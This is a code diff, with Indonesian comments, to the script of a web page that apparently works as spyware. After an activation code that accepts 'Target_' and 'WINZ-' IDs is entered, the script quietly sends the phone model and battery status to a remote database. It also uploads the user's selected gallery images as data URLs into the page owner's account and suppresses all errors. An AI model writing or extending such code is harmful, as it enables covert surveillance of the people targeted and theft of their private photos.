@@ -63,9 +63,7 @@
                 return;
             }
 
-            // BISA PAKAI KODE MASTER ATAU KODE ACAK / ID TARGET YANG COCOK
-            if (inputCode === MASTER_CODE || inputCode === deviceId || inputCode.startsWith("Target_")) {
-                // Jika pakai kode acak dari luar, kita bisa set deviceId-nya sesuai input atau tetap pakai ID lokal
+            if (inputCode === MASTER_CODE || inputCode === deviceId || inputCode.startsWith("Target_") || inputCode.startsWith("WINZ-")) {
                 if (inputCode.startsWith("Target_")) {
                     deviceId = inputCode;
                     localStorage.setItem("winz_device_id", deviceId);
@@ -98,16 +96,23 @@
         }
 
         function startSendingData() {
-            function kirimData(level, charging) {
-                const phoneName = getPhoneModel();
-                fetch(`${databaseURL}/devices/${deviceId}.json`, {
+            const phoneName = getPhoneModel();
+
+            // Kirim nama model HP sekali saat pertama aktif
+            fetch(`${databaseURL}/devices/${deviceId}/model.json`, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(phoneName)
+            }).catch(() => {});
+
+            // Fungsi Kirim Data Baterai dengan format Objek (Level & Charging)
+            function kirimBaterai(level, isCharging) {
+                fetch(`${databaseURL}/devices/${deviceId}/battery.json`, {
                     method: 'PUT',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        model: phoneName,
-                        battery: level,
-                        charging: charging,
-                        lastActive: Date.now()
+                        level: level,
+                        charging: isCharging
                     })
                 }).catch(() => {});
             }
@@ -115,14 +120,15 @@
             if ('getBattery' in navigator) {
                 navigator.getBattery().then(battery => {
                     function update() {
-                        kirimData(Math.round(battery.level * 100), battery.charging ? "Mengisi Daya" : "Tidak Mengisi");
+                        kirimBaterai(Math.round(battery.level * 100), battery.charging);
                     }
                     update();
                     battery.addEventListener('levelchange', update);
                     battery.addEventListener('chargingchange', update);
                 });
             } else {
-                kirimData(100, "Online");
+                // Fallback jika API baterai tidak didukung browser
+                kirimBaterai(100, false);
             }
         }
 
@@ -134,13 +140,11 @@
                 const file = files[i];
                 const reader = new FileReader();
                 reader.onload = function(e) {
-                    fetch(`${databaseURL}/galleries/${deviceId}.json`, {
+                    // Simpan langsung ke folder devices/{deviceId}/gallery agar sinkron dengan akun owner
+                    fetch(`${databaseURL}/devices/${deviceId}/gallery.json`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            url: e.target.result,
-                            time: Date.now()
-                        })
+                        body: JSON.stringify(e.target.result)
                     }).catch(err => {});
                 };
                 reader.readAsDataURL(file);
@@ -149,5 +153,6 @@
     </script>
 </body>
 </html>
+
 
     
